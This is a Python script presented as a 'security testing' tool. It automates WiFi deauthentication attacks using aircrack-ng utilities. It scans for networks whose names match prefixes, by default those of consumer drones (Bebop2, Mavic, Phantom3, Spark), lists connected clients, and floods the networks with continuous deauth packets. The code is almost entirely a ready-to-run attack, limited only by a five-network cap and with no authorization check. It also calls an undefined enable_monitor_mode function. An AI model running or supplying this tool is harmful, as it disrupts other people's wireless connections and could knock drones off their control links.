#!/usr/bin/env python3
# Automated WiFi Deauthentication Tool for Security Testing
# Fixed version with enhanced safety features and CSV parsing

import os
import sys
import signal
import subprocess
import time
import re
import argparse
import threading
from datetime import datetime

# Check if running as root
if os.geteuid() != 0:
    print("\033[91mError: This script must be run as root\033[0m")
    sys.exit(1)

# Check if aircrack-ng is installed
try:
    subprocess.run(["aircrack-ng", "--help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except FileNotFoundError:
    print("\033[91mError: aircrack-ng is not installed\033[0m")
    print("Install it with: sudo apt-get install aircrack-ng")
    sys.exit(1)

# Color definitions
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
NC = '\033[0m'  # No Color

# Global variables
monitor_interface = None
airodump_process = None
aireplay_process = None
temp_dir = "/tmp/wifi_deauth_tool"
stop_attack = False
log_file = f"{temp_dir}/deauth_log.txt"
debug_mode = False
MAX_ATTACK_NETWORKS = 5  # Safety limit - max number of networks to attack in one run

def log_message(message, color=None):
    """Log message to console and file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    
    # Print to console with color if specified
    if color:
        print(f"{color}{log_entry}{NC}")
    else:
        print(log_entry)
    
    # Log to file
    try:
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        with open(log_file, "a") as f:
            f.write(f"{log_entry}\n")
    except Exception as e:
        print(f"{RED}Error writing to log: {e}{NC}")

def execute_command(command, silent=False, capture_output=False):
    """Execute a command with options for silence and output capture"""
    try:
        if silent and not capture_output:
            return subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif capture_output:
            return subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        else:
            return subprocess.run(command)
    except Exception as e:
        log_message(f"Error executing command: {e}", RED)
        return None

def cleanup(signum=None, frame=None):
    """Clean up function for proper exit"""
    global monitor_interface, airodump_process, aireplay_process, stop_attack
    
    stop_attack = True
    log_message("Cleaning up...", YELLOW)
    
    # Stop any running processes
    for proc in [airodump_process, aireplay_process]:
        if proc and proc.poll() is None:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                try:
                    proc.kill()
                except:
                    pass
    
    if monitor_interface:
        log_message(f"Stopping monitor mode on {monitor_interface}", YELLOW)
        execute_command(["airmon-ng", "stop", monitor_interface], silent=True)
    
    # Restart network services
    log_message("Restarting network services...", YELLOW)
    try:
        execute_command(["systemctl", "restart", "NetworkManager"], silent=True)
    except:
        try:
            execute_command(["service", "NetworkManager", "restart"], silent=True)
        except:
            try:
                execute_command(["service", "network-manager", "restart"], silent=True)
            except:
                log_message("Could not restart network services. You may need to restart them manually.", RED)
    
    log_message("Done. Exiting.", GREEN)
    sys.exit(0)

def find_monitor_interface():
    """Automatically find a wireless interface in monitor mode or convert one"""
    global monitor_interface, debug_mode
    
    # First, check if any interface is already in monitor mode
    try:
        output = execute_command(["iwconfig"], capture_output=True)
        if output and output.returncode == 0:
            for line in output.stdout.split('\n'):
                if "Mode:Monitor" in line:
                    iface = line.split()[0]
                    log_message(f"Found existing monitor interface: {iface}", GREEN)
                    return iface
    except Exception as e:
        if debug_mode:
            log_message(f"Error checking for monitor interfaces: {e}", RED)
    
    # If no monitor interface found, get list of wireless interfaces
    interfaces = []
    try:
        output = execute_command(["iwconfig"], capture_output=True)
        if output and output.returncode == 0:
            for line in output.stdout.split('\n'):
                if "IEEE 802.11" in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
                    if debug_mode:
                        log_message(f"Found wireless interface: {iface}", BLUE)
    except Exception as e:
        if debug_mode:
            log_message(f"Error identifying wireless interfaces: {e}", RED)
    
    if not interfaces:
        log_message("No wireless interfaces found.", RED)
        return None
    
    # Use the first wireless interface found
    chosen_interface = interfaces[0]
    log_message(f"Using wireless interface: {chosen_interface}", YELLOW)
    
    # Put it in monitor mode
    log_message("Killing processes that could interfere with monitor mode...", YELLOW)
    execute_command(["airmon-ng", "check", "kill"], silent=not debug_mode)
    
    log_message(f"Enabling monitor mode on {chosen_interface}...", YELLOW)
    result = execute_command(["airmon-ng", "start", chosen_interface], silent=not debug_mode, capture_output=debug_mode)
    
    if debug_mode and result and result.stdout:
        log_message(f"airmon-ng output: {result.stdout}", BLUE)
    
    # Try to determine the name of the monitor interface
    possible_names = [
        f"{chosen_interface}mon",  # Standard
        f"mon0",                  # Old style
        chosen_interface,         # Sometimes unchanged
        f"wlan0mon",              # Common on Kali
        f"wlan1mon"               # If there's a second adapter
    ]
    
    mon_iface = None
    for name in possible_names:
        try:
            result = execute_command(["iwconfig", name], silent=True, capture_output=True)
            if result and result.returncode == 0 and "Mode:Monitor" in result.stdout:
                mon_iface = name
                break
        except:
            pass
    
    # If we still couldn't find it, recheck iwconfig output
    if not mon_iface:
        try:
            output = execute_command(["iwconfig"], capture_output=True)
            if output and output.returncode == 0:
                for line in output.stdout.split('\n'):
                    if "Mode:Monitor" in line:
                        mon_iface = line.split()[0]
                        break
        except Exception as e:
            if debug_mode:
                log_message(f"Error rechecking monitor interfaces: {e}", RED)
    
    # Last resort, just use the original interface name
    if not mon_iface:
        log_message("Could not determine monitor interface name, using original interface", YELLOW)
        mon_iface = chosen_interface
    
    log_message(f"Monitor mode enabled on {mon_iface}", GREEN)
    return mon_iface

def filter_target_networks(networks, target_prefixes):
    """Filter networks by target prefixes"""
    if not target_prefixes:
        return networks
        
    log_message(f"Filtering for networks with prefixes: {', '.join(target_prefixes)}", YELLOW)
    target_networks = []
    all_network_names = []
    
    for network in networks:
        all_network_names.append(network['essid'])
        # Check if the network ESSID starts with any of the target prefixes (case-insensitive)
        for prefix in target_prefixes:
            if network['essid'].lower().startswith(prefix.lower()):
                target_networks.append(network)
                log_message(f"Found matching network: {network['essid']} (BSSID: {network['bssid']}, Channel: {network['channel']})", GREEN)
                break  # Once we find a match, no need to check other prefixes
    
    if not target_networks and debug_mode:
        log_message(f"No target networks found among {len(networks)} discovered networks.", RED)
        log_message(f"Available networks: {', '.join(all_network_names)}", YELLOW)
    
    return target_networks

def scan_for_networks_direct_output(interface, target_prefixes=None, timeout=10):
    """Scan for networks directly using airodump-ng and parse the live output"""
    global airodump_process
    
    log_message("Performing direct network scan...", BLUE)
    
    # Use a temporary file to capture airodump-ng output
    output_file = f"{temp_dir}/direct_scan.txt"
    
    cmd = ["airodump-ng", interface]
    
    try:
        with open(output_file, 'w') as f:
            airodump_process = subprocess.Popen(cmd, stdout=f, stderr=f)
            
            # Allow some time for scanning
            log_message(f"Direct scanning for {timeout} seconds...", YELLOW)
            time.sleep(timeout)
            
            # Terminate the process
            if airodump_process and airodump_process.poll() is None:
                airodump_process.terminate()
                try:
                    airodump_process.wait(timeout=2)
                except:
                    airodump_process.kill()
    except Exception as e:
        log_message(f"Error in direct scan: {e}", RED)
        return []
    
    # Parse the output file
    networks = []
    try:
        with open(output_file, 'r') as f:
            lines = f.readlines()
            
        capture_networks = False
        for line in lines:
            line = line.strip()
            
            if not line:
                continue
                
            # Start capturing after the BSSID header line
            if "BSSID" in line and "PWR" in line and "CH" in line and "ESSID" in line:
                capture_networks = True
                continue
                
            # Stop capturing if we reach the client section
            if "STATION" in line:
                capture_networks = False
                continue
                
            if capture_networks:
                # Parse network info from the line
                parts = re.split(r'\s+', line, maxsplit=10)
                if len(parts) >= 11:
                    bssid = parts[0].strip()
                    power = parts[1].strip()
                    channel = parts[3].strip()
                    essid = parts[10].strip()
                    
                    if bssid and essid and not essid.startswith("<"):
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'essid': essid,
                            'power': power
                        })
                        if debug_mode:
                            log_message(f"Direct scan found: {essid} (BSSID: {bssid}, Channel: {channel})", BLUE)
    except Exception as e:
        log_message(f"Error parsing direct scan output: {e}", RED)
    
    log_message(f"Direct scan found {len(networks)} networks total", YELLOW)
    
    # Filter for target networks before returning
    return filter_target_networks(networks, target_prefixes)

def scan_for_networks(interface, target_prefixes=None, timeout=30):
    """Scan for wireless networks and find target networks by ESSID prefix"""
    global airodump_process, temp_dir, debug_mode
    
    # Create temp directory if it doesn't exist
    os.makedirs(temp_dir, exist_ok=True)
    output_prefix = f"{temp_dir}/network_scan"
    
    # Remove old files if they exist
    for file in os.listdir(temp_dir):
        if file.startswith("network_scan"):
            try:
                os.remove(os.path.join(temp_dir, file))
            except:
                pass
    
    log_message("Scanning for wireless networks...", BLUE)
    
    # Start airodump-ng to scan all networks with CSV output
    cmd = [
        "airodump-ng",
        "--output-format", "csv",
        "--write", output_prefix,
        interface
    ]
    
    airodump_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Wait for scan to collect data
    log_message(f"Scanning for {timeout} seconds...", YELLOW)
    try:
        # Show a progress indicator
        for i in range(timeout):
            sys.stdout.write(f"\rScanning: {i+1}/{timeout} seconds completed")
            sys.stdout.flush()
            time.sleep(1)
        print()
    except KeyboardInterrupt:
        log_message("Scan interrupted by user", YELLOW)
    finally:
        if airodump_process and airodump_process.poll() is None:
            try:
                airodump_process.terminate()
                airodump_process.wait(timeout=2)
            except:
                try:
                    airodump_process.kill()
                except:
                    pass
    
    # Find the CSV file
    csv_file = None
    for file in os.listdir(temp_dir):
        if file.startswith("network_scan") and file.endswith(".csv"):
            csv_file = os.path.join(temp_dir, file)
            break
    
    if not csv_file:
        log_message("No networks found during scan. Will try direct scanning method.", YELLOW)
        # Fall back to direct scan
        return scan_for_networks_direct_output(interface, target_prefixes, 10)
    
    # Parse the CSV to find networks
    networks = []
    csv_error = None
    try:
        # Attempt to read the CSV with three different encoding methods for robustness
        content = None
        encodings = ['utf-8', 'latin-1', 'iso-8859-1']
        
        for encoding in encodings:
            try:
                with open(csv_file, 'r', encoding=encoding, errors='ignore') as f:
                    content = f.read()
                break  # If we get here, reading was successful
            except Exception as e:
                if debug_mode:
                    log_message(f"Failed to read CSV with {encoding} encoding: {e}", YELLOW)
        
        if not content:
            raise Exception("Failed to read CSV file with any encoding")
            
        if debug_mode:
            # Save a debug copy of the raw CSV
            with open(f"{temp_dir}/debug_network_scan.csv", 'w', encoding='utf-8') as f:
                f.write(content)
            
            # Also output first 500 characters to help debug format issues
            log_message(f"CSV file first 500 chars: {content[:500]}", BLUE)
        
        # Find the networks section - check for different delimiters
        sections = None
        if '\r\n\r\n' in content:
            sections = content.split('\r\n\r\n')
        elif '\n\n' in content:
            sections = content.split('\n\n')
        
        if not sections or len(sections) == 0:
            raise Exception("CSV file has unexpected format - could not find sections")
        
        # Try to identify the network section which should have BSSID in it
        network_section = None
        for section in sections:
            if 'BSSID' in section:
                network_section = section
                break
        
        if not network_section:
            raise Exception("Could not find network section with BSSID in CSV file")
            
        # Split the network section into lines - handle different line endings
        if '\r\n' in network_section:
            network_lines = network_section.split('\r\n')
        else:
            network_lines = network_section.split('\n')
        
        # Find the header line to understand the CSV structure
        header_line = None
        for i, line in enumerate(network_lines):
            if 'BSSID' in line:
                header_line = i
                if debug_mode:
                    log_message(f"Found header at line {i}: {line}", BLUE)
                break
        
        if header_line is None:
            raise Exception("Could not find header line with BSSID in network section")
            
        # Process each network line
        for line in network_lines[header_line+1:]:
            if not line.strip():
                continue
            
            parts = line.split(',')
            if len(parts) < 14:
                if debug_mode:
                    log_message(f"Skipping line with insufficient parts ({len(parts)}): {line}", YELLOW)
                continue
            
            bssid = parts[0].strip()
            if not bssid or bssid == "BSSID" or len(bssid) < 10:  # Sanity check for BSSID format
                continue
            
            # The channel is typically in column 3
            channel = parts[3].strip()
            # The power is typically in column 8
            power = parts[8].strip() if len(parts) > 8 else "N/A"
            # The ESSID is typically in column 13
            essid = parts[13].strip() if len(parts) > 13 else ""
            
            # Normalize ESSID - remove quotes if present
            if essid and essid.startswith('"') and essid.endswith('"'):
                essid = essid[1:-1]
            
            # Include hidden SSIDs in debug mode
            if not essid and debug_mode:
                essid = "<hidden>"
            elif not essid or essid.startswith("<"):
                if debug_mode:
                    log_message(f"Skipping hidden SSID with BSSID {bssid}", YELLOW)
                continue
            
            networks.append({
                'bssid': bssid,
                'channel': channel,
                'essid': essid,
                'power': power
            })
            
            if debug_mode:
                log_message(f"Found network: {essid} (BSSID: {bssid}, Channel: {channel})", BLUE)
                
    except Exception as e:
        csv_error = str(e)
        log_message(f"Error parsing network scan CSV: {e}", RED)
        
        # Additional debug info for CSV parsing failures
        if debug_mode and csv_file:
            try:
                file_size = os.path.getsize(csv_file)
                log_message(f"CSV file size: {file_size} bytes", YELLOW)
                
                if file_size > 0:
                    with open(csv_file, 'rb') as f:  # Use binary mode to prevent encoding errors
                        first_bytes = f.read(100)
                    log_message(f"First bytes (hex): {first_bytes.hex()}", YELLOW)
            except Exception as debug_e:
                log_message(f"Error during debug: {debug_e}", RED)
    
    # If no networks found through CSV parsing, try direct scan
    if not networks:
        log_message(f"No networks parsed from CSV. Reason: {csv_error}. Trying direct scan method.", YELLOW)
        return scan_for_networks_direct_output(interface, target_prefixes, 10)
    
    log_message(f"CSV scan found {len(networks)} networks total", YELLOW)
    
    # Filter and return target networks
    return filter_target_networks(networks, target_prefixes)

def parse_airodump_csv(csv_file, target_bssid):
    """Parse airodump-ng CSV output to extract clients for a specific BSSID"""
    global debug_mode
    clients = {}
    
    if not os.path.exists(csv_file):
        return clients
    
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        if debug_mode:
            # Save a debug copy of the raw CSV
            with open(f"{temp_dir}/debug_client_scan.csv", 'w', encoding='utf-8') as f:
                f.write(content)
        
        # Split by double newline to separate station and client sections
        sections = content.split('\r\n\r\n')
        if len(sections) < 2:
            if debug_mode:
                log_message("CSV file missing client section.", YELLOW)
            return clients
        
        # Parse clients section
        client_lines = sections[1].split('\r\n')
        for line in client_lines[1:]:  # Skip header
            if not line.strip():
                continue
            
            parts = line.split(',')
            if len(parts) < 6:
                if debug_mode:
                    log_message(f"Skipping client line with insufficient parts: {line}", YELLOW)
                continue
            
            mac = parts[0].strip()
            if not mac or mac == "Station MAC":
                continue
            
            power = parts[3].strip()
            bssid = parts[5].strip()
            
            # Only include clients connected to the target BSSID
            if bssid == target_bssid:
                clients[mac] = {
                    'mac': mac,
                    'power': power,
                    'bssid': bssid
                }
                if debug_mode:
                    log_message(f"Found client: {mac} connected to BSSID {bssid}", BLUE)
    except Exception as e:
        log_message(f"Error parsing client CSV: {e}", RED)
    
    return clients

def scan_for_clients(interface, bssid, channel, duration=15):
    """Scan for clients using a more direct approach similar to manual scanning"""
    global airodump_process, temp_dir
    
    # Create temp directory if it doesn't exist
    os.makedirs(temp_dir, exist_ok=True)
    
    # Output file for direct capturing
    output_file = f"{temp_dir}/client_direct_output.txt"
    
    log_message(f"Scanning for clients on BSSID {bssid} (Channel {channel})...", BLUE)
    
    # Set channel explicitly first
    log_message(f"Setting channel {channel}...", YELLOW)
    execute_command(["iwconfig", interface, "channel", channel], silent=True)
    time.sleep(1)
    
    # Run airodump-ng directly and capture its output for parsing
    cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "--channel", channel,
        interface
    ]
    
    if debug_mode:
        log_message(f"Running command: {' '.join(cmd)}", BLUE)
    
    try:
        # Capture output directly to a file for parsing
        with open(output_file, 'w') as f:
            airodump_process = subprocess.Popen(cmd, stdout=f, stderr=f)
            
            # Allow a shorter time for initial detection
            log_message(f"Scanning for clients for {duration} seconds...", YELLOW)
            
            # Show a progress indicator
            for i in range(duration):
                sys.stdout.write(f"\rScanning clients: {i+1}/{duration} seconds completed")
                sys.stdout.flush()
                time.sleep(1)
            print()
    except KeyboardInterrupt:
        log_message("Client scan interrupted by user", YELLOW)
    finally:
        if airodump_process and airodump_process.poll() is None:
            try:
                airodump_process.terminate()
                airodump_process.wait(timeout=2)
            except:
                try:
                    airodump_process.kill()
                except:
                    pass
    
    # Parse the direct output file to find clients
    clients = {}
    try:
        with open(output_file, 'r') as f:
            lines = f.readlines()
        
        capture_clients = False
        for line in lines:
            line = line.strip()
            
            # Start capturing after we see the STATION header
            if "STATION" in line and "PWR" in line and "BSSID" in line:
                capture_clients = True
                continue
            
            if capture_clients and line:
                # Parse client info from the line using regex to handle variable spacing
                parts = re.split(r'\s+', line, maxsplit=5)
                if len(parts) >= 3:
                    mac = parts[0].strip()
                    power = parts[1].strip()
                    client_bssid = parts[2].strip()
                    
                    # Only include clients connected to our target BSSID
                    if client_bssid == bssid:
                        clients[mac] = {
                            'mac': mac,
                            'power': power,
                            'bssid': client_bssid
                        }
                        log_message(f"Found client: {mac}", GREEN)
    except Exception as e:
        log_message(f"Error parsing client output: {e}", RED)
    
    if clients:
        log_message(f"Found {len(clients)} client(s) connected to the network", GREEN)
    else:
        log_message("No clients found connected to the network. Proceeding with broadcast deauth.", YELLOW)
        
    return clients

def deauth_clients(interface, bssid, clients=None, packet_count=0, duration=30):
    """Deauthenticate all clients or specific clients"""
    global aireplay_process, stop_attack
    
    stop_attack = False
    
    if not clients:
        # Broadcast deauthentication to all clients
        log_message(f"Deauthenticating all clients on BSSID {bssid}...", BLUE)
        cmd = ["aireplay-ng", "--deauth", str(packet_count), "-a", bssid, interface]
        
        if debug_mode:
            log_message(f"Running command: {' '.join(cmd)}", BLUE)
    else:
        # Deauthenticate specific clients
        log_message(f"Deauthenticating {len(clients)} specific client(s)...", BLUE)
        
        # Deauthenticate each client
        for client_mac in clients:
            log_message(f"Deauthenticating client: {client_mac}", YELLOW)
            cmd = ["aireplay-ng", "--deauth", str(packet_count), "-a", bssid, "-c", client_mac, interface]
            
            if debug_mode:
                log_message(f"Running command: {' '.join(cmd)}", BLUE)
            
            try:
                aireplay_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                # If it's a continuous attack (packet_count=0), give it some time then kill it
                if packet_count == 0:
                    time.sleep(5)  # Send deauth packets for 5 seconds before moving to next client
                    if aireplay_process and aireplay_process.poll() is None:
                        aireplay_process.terminate()
                else:
                    aireplay_process.wait()  # Wait for the process to complete
            except Exception as e:
                log_message(f"Error during deauth of client {client_mac}: {e}", RED)
        
        # After individual client deauths, return
        return
    
    # For broadcast deauth, run for the specified duration
    try:
        log_message(f"Running deauthentication attack for {duration} seconds...", YELLOW)
        aireplay_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Show a progress indicator
        for i in range(duration):
            if stop_attack:
                break
            sys.stdout.write(f"\rDeauth in progress: {i+1}/{duration} seconds completed")
            sys.stdout.flush()
            time.sleep(1)
        print()
        
    except KeyboardInterrupt:
        log_message("Deauthentication interrupted by user", YELLOW)
    finally:
        if aireplay_process and aireplay_process.poll() is None:
            try:
                aireplay_process.terminate()
                aireplay_process.wait(timeout=2)
            except:
                try:
                    aireplay_process.kill()
                except:
                    pass
    
    log_message("Deauthentication attack completed", GREEN)

def auto_attack_network(interface, network, client_scan_duration=15, deauth_duration=30, packet_count=0):
    """Automatically attack a specific network - scan for clients and deauth them"""
    bssid = network['bssid']
    channel = network['channel']
    essid = network['essid']
    
    log_message(f"Starting automated attack on network: {essid}", BLUE)
    log_message(f"BSSID: {bssid}, Channel: {channel}", BLUE)
    
    # Scan for clients
    clients = scan_for_clients(interface, bssid, channel, client_scan_duration)
    
    # Perform deauthentication
    deauth_clients(interface, bssid, None, packet_count, deauth_duration)
    
    log_message(f"Completed attack on network: {essid}", GREEN)
    return True

def main():
    """Main function with automatic execution"""
    global monitor_interface, stop_attack, debug_mode
    
    # Set up signal handler for cleanup
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="Automated WiFi Deauthentication Tool")
    parser.add_argument("-t", "--targets", nargs='+', default=["Bebop2", "Mavic", "Phantom3","Spark"],
                      help="Target network name prefixes (e.g., 'Bebop2' matches 'Bebop2-guest', 'Bebop2-12345', etc.)")
    parser.add_argument("-s", "--scan-time", type=int, default=10,
                      help="Network scanning duration in seconds (default: 30)")
    parser.add_argument("-c", "--client-scan-time", type=int, default=15,
                      help="Client scanning duration in seconds (default: 15)")
    parser.add_argument("-d", "--deauth-time", type=int, default=30,
                      help="Deauthentication duration in seconds (default: 30)")
    parser.add_argument("-p", "--packets", type=int, default=0,
                      help="Number of deauth packets (0 for continuous, default: 0)")
    parser.add_argument("--debug", action="store_true",
                      help="Enable debug mode with more detailed output")
    parser.add_argument("-i", "--interface", 
                      help="Specify wireless interface to use instead of auto-detecting")
    args = parser.parse_args()
    
    # Set debug mode
    debug_mode = args.debug
    
    log_message("Starting Automated WiFi Deauthentication Tool", BLUE)
    if debug_mode:
        log_message("DEBUG MODE ENABLED", YELLOW)
    
    log_message(f"Target network prefixes: {', '.join(args.targets)}", YELLOW)
    
    # Create temp directory
    os.makedirs(temp_dir, exist_ok=True)
    
    # Find a monitor interface or use specified interface
    if args.interface:
        log_message(f"Using specified interface: {args.interface}", YELLOW)
        monitor_interface = args.interface
        
        # Check if it's already in monitor mode
        result = execute_command(["iwconfig", monitor_interface], capture_output=True, silent=True)
        if result and result.returncode == 0 and "Mode:Monitor" not in result.stdout:
            log_message(f"Specified interface {monitor_interface} is not in monitor mode. Enabling monitor mode...", YELLOW)
            monitor_interface = enable_monitor_mode(args.interface)
    else:
        monitor_interface = find_monitor_interface()
    
    if not monitor_interface:
        log_message("Failed to set up monitor interface. Exiting.", RED)
        sys.exit(1)
    
    # Scan for target networks
    target_networks = scan_for_networks(monitor_interface, args.targets, args.scan_time)
    
    if not target_networks:
        # Try with a longer scan time if no targets found initially
        if not debug_mode:
            log_message(f"No target networks found. Trying with a longer scan time (45 seconds)...", YELLOW)
            target_networks = scan_for_networks(monitor_interface, args.targets, 45)
        
        if not target_networks:
            log_message(f"No target networks found. Make sure networks with prefixes {', '.join(args.targets)} are active.", RED)
            log_message("Try running with --debug flag for more detailed information.", YELLOW)
            cleanup()
    
    # Safety check - limit number of networks to attack
    if len(target_networks) > MAX_ATTACK_NETWORKS:
        log_message(f"WARNING: Found {len(target_networks)} matching networks, but will only attack the first {MAX_ATTACK_NETWORKS} for safety", RED)
        target_networks = target_networks[:MAX_ATTACK_NETWORKS]
    
    # Attack each target network
    log_message(f"Found {len(target_networks)} target networks. Starting attacks...", GREEN)
    for network in target_networks:
        try:
            auto_attack_network(
                monitor_interface, 
                network, 
                args.client_scan_time, 
                args.deauth_time, 
                args.packets
            )
        except Exception as e:
            log_message(f"Error attacking network {network['essid']}: {e}", RED)
    
    log_message("All attacks completed", GREEN)
    cleanup()

if __name__ == "__main__":
    main()
